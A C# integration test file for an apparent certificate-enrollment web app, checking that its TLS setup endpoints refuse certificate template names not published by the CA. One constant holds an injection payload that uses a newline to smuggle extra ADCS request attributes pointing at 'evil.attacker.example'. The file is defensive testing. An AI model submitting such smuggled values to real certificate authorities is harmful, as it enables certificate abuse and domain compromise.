using System.Net;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using Certus.Core.Configuration;
using Certus.Core.Setup;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.AspNetCore.Hosting;

namespace Certus.Web.Tests;

/// <summary>
/// The two wizard endpoints that carry a template name into ADCS enrollment
/// must resolve it against the CA's published list before it reaches the
/// request attribute string (issue #175, the CVE-2026-54121 "CertiGhost"
/// class). The character guard alone is not the whole story here: these two
/// also submit, so the name has to come from the CA rather than merely look
/// harmless.
///
/// Why a factory of its own. GuardTlsProvisioning refuses both endpoints
/// outright when the CA mode is "mock", which is why
/// TlsCertificateIntegrationTests can only assert that refusal. Clearing
/// UseMockCa moves CaMode to "unconfigured", which the guard lets through,
/// and that is the honest production state for these endpoints, because the
/// wizard runs them before any CA is saved and takes the candidate CA from the
/// request body. Certus.Web registers the mock client factory unconditionally,
/// so no COM is touched and no real CA is reached.
///
/// The connection string stays empty deliberately. StartupValidator refuses to
/// start at all when Auth:Mode=Disabled meets a configured CA (issue #27,
/// SEC-F1), and the shared factory disables auth.
/// </summary>
[Trait("Category", "Integration")]
public class TlsCertificateTemplateInjectionIntegrationTests : IDisposable
{
    /// <summary>The CertiGhost shape: a newline, then the attributes the CVE rides in.</summary>
    private const string CertiGhostPayload =
        "WebServer\ncdc:evil.attacker.example\nrmd:DC01.contoso.com";

    private const string CaConnectionString = "ca.contoso.com\\Contoso-CA";
    private const string ExternalUrl = "https://certus.contoso.com:5001";

    /// <summary>
    /// A certificate the apply endpoint can find, so the request reaches the
    /// template resolution below the thumbprint lookup rather than 404ing
    /// above it. Nothing is installed: this store is in memory only, unlike
    /// the machine store the service host uses.
    /// </summary>
    private sealed class InMemoryCertificateStore : IHttpsCertificateStore
    {
        private readonly X509Certificate2 _certificate;

        public InMemoryCertificateStore(X509Certificate2 certificate) =>
            _certificate = certificate;

        public string Thumbprint => _certificate.Thumbprint;

        public string Install(X509Certificate2 certificateWithKey) =>
            certificateWithKey.Thumbprint;

        public X509Certificate2? Find(string thumbprint) =>
            string.Equals(thumbprint, _certificate.Thumbprint, StringComparison.OrdinalIgnoreCase)
                ? X509CertificateLoader.LoadCertificate(_certificate.RawData)
                : null;

        public bool Remove(string thumbprint) => false;

        public int RemoveSuperseded(string keepThumbprint) => 0;
    }

    private sealed class Factory : CertusWebApplicationFactory
    {
        public InMemoryCertificateStore Store { get; } =
            new(CreateSelfSignedCertificate());

        public string DataDir => TempDataDir;

        protected override void ConfigureWebHost(IWebHostBuilder builder)
        {
            base.ConfigureWebHost(builder);

            builder.ConfigureServices(services =>
            {
                // PostConfigure rather than UseSetting: UseMockCa is present in
                // appsettings.json, so host configuration would lose to the JSON
                // file. The factory's other overrides use UseSetting precisely
                // because their keys are absent there.
                services.PostConfigure<CertusOptions>(o => o.UseMockCa = false);

                services.AddSingleton<IHttpsCertificateStore>(Store);
            });
        }

        private static X509Certificate2 CreateSelfSignedCertificate()
        {
            using var key = RSA.Create(2048);
            var request = new CertificateRequest(
                "CN=certus.contoso.com", key, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

            var san = new SubjectAlternativeNameBuilder();
            san.AddDnsName("certus.contoso.com");
            request.CertificateExtensions.Add(san.Build());

            return request.CreateSelfSigned(
                DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(30));
        }
    }

    private readonly Factory _factory = new();
    private readonly HttpClient _client;

    public TlsCertificateTemplateInjectionIntegrationTests()
    {
        _client = _factory.CreateClient();
    }

    public void Dispose()
    {
        _client.Dispose();
        _factory.Dispose();
        GC.SuppressFinalize(this);
    }

    private static StringContent JsonContent(object payload) => new(
        JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");

    private static async Task<string?> ReadErrorAsync(HttpResponseMessage response)
    {
        var json = await response.Content.ReadAsStringAsync();
        var body = JsonSerializer.Deserialize<JsonElement>(json);
        return body.TryGetProperty("error", out var error) ? error.GetString() : null;
    }

    /// <summary>
    /// The property AdcsRequestAttributes was written to hold: a refusal names
    /// what was wrong without carrying the rejected value onward.
    /// </summary>
    private static void ShouldNotEchoThePayload(string? error)
    {
        error.Should().NotBeNull();
        error.Should().NotContain("cdc:");
        error.Should().NotContain("rmd:");
        error.Should().NotContainAny("\n", "\r");
    }

    [Fact]
    public async Task Provision_TemplateCarryingTheCertiGhostPayload_IsRefusedBeforeSubmission()
    {
        var response = await _client.PostAsync("/api/setup/tls-certificate", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            templateName = CertiGhostPayload,
            externalUrl = ExternalUrl,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);

        var error = await ReadErrorAsync(response);
        error.Should().Contain("not published by the CA");
        ShouldNotEchoThePayload(error);
    }

    [Fact]
    public async Task Provision_CleanButUnpublishedTemplate_IsRefused()
    {
        // The gate is resolution against the CA, not a character filter. A name
        // that passes every character check but that the CA does not publish
        // must not reach the attribute string either.
        var response = await _client.PostAsync("/api/setup/tls-certificate", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            templateName = "NoSuchTemplate",
            externalUrl = ExternalUrl,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await ReadErrorAsync(response)).Should().Contain("not published by the CA");
    }

    [Theory]
    // The programmatic name and, because the wizard's template list offers
    // display names and the resolver accepts either form, the mock CA's
    // display name for the same template.
    [InlineData("WebServer")]
    [InlineData("Web Server")]
    public async Task Provision_PublishedTemplate_EnrollsAndRecordsTheProgrammaticName(
        string templateName)
    {
        // The negative control: the guard must not narrow what a legitimate
        // wizard run can do.
        var response = await _client.PostAsync("/api/setup/tls-certificate", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            templateName,
            externalUrl = ExternalUrl,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.OK);

        var body = JsonSerializer.Deserialize<JsonElement>(
            await response.Content.ReadAsStringAsync());
        body.GetProperty("outcome").GetString().Should().Be("installed");

        // Whichever form was posted, the resolved programmatic name is what is
        // recorded, so the renewal path submits a name the CA published.
        SetupStatus.Load(Path.Combine(_factory.DataDir, SetupStatus.FileName))
            .EnabledTemplates.Should().Equal("WebServer");
    }

    [Fact]
    public async Task Apply_TemplateCarryingTheCertiGhostPayload_IsRefusedAndRecordsNothing()
    {
        // Apply submits nothing, but it records the template name into the
        // wizard draft and the settings overlay, and the renewal path submits
        // that recorded name later with no resolution of its own.
        var response = await _client.PostAsync("/api/setup/tls-certificate/apply", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            templateName = CertiGhostPayload,
            externalUrl = ExternalUrl,
            thumbprint = _factory.Store.Thumbprint,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);

        var error = await ReadErrorAsync(response);
        error.Should().Contain("not published by the CA");
        ShouldNotEchoThePayload(error);

        SetupStatus.Load(Path.Combine(_factory.DataDir, SetupStatus.FileName))
            .EnabledTemplates.Should().NotContain(t => t.Contains("cdc:"));
    }

    [Fact]
    public async Task Apply_CleanButUnpublishedTemplate_IsRefused()
    {
        var response = await _client.PostAsync("/api/setup/tls-certificate/apply", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            templateName = "NoSuchTemplate",
            externalUrl = ExternalUrl,
            thumbprint = _factory.Store.Thumbprint,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await ReadErrorAsync(response)).Should().Contain("not published by the CA");
    }

    [Fact]
    public async Task Apply_PublishedTemplate_RecordsTheProgrammaticName()
    {
        var response = await _client.PostAsync("/api/setup/tls-certificate/apply", JsonContent(new
        {
            caConnectionString = CaConnectionString,
            // The display name, so the recorded value proves resolution ran
            // rather than the request body being written through.
            templateName = "Web Server",
            externalUrl = ExternalUrl,
            thumbprint = _factory.Store.Thumbprint,
        }));

        response.StatusCode.Should().Be(HttpStatusCode.OK);

        SetupStatus.Load(Path.Combine(_factory.DataDir, SetupStatus.FileName))
            .EnabledTemplates.Should().Equal("WebServer");
    }
}
